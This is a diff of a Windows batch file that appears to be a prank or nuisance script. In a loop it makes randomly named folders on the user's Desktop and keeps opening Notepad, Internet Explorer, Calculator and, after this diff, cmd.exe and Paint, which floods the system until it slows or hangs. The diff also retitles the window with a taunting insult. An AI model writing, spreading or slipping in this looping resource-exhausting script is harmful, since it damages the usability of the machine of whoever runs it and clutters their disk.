@@ -1,5 +1,5 @@
 @echo off
-title Memes
+title u fucked up
 color 00
 C:
 cd %userprofile%/Desktop
@@ -10,4 +10,6 @@ mkdir %random%%random%%random%
 start notepad.exe
 start iexplore.exe
 start calc.exe
+start cmd.exe
+start mspaint.exe
 goto start
